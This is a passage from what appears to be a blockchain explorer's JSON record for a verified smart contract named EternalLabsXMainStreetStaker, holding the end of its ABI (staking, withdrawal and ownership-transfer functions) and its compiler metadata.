ame\":\"stakeRemainingGnana\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"newOwner\",\"type\":\"address\"}],\"name\":\"transferOwnership\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"amount\",\"type\":\"uint256\"}],\"name\":\"withdrawBanana\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"_amount\",\"type\":\"uint256\"}],\"name\":\"withdrawGnana\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"withdrawLeftOverBanana\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"withdrawLeftOverGnana\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"withdrawRemainingBnb\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"withdrawRemainingMainstreet\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"stateMutability\":\"payable\",\"type\":\"receive\"}]", "ContractName": "EternalLabsXMainStreetStaker", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "1", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "None", "Proxy": "0", "Implementation": "", "SwarmSource": "ipfs://4c1914984d179122546e7e98e2f22a15a73029e883ea59518a1af533edb66480"}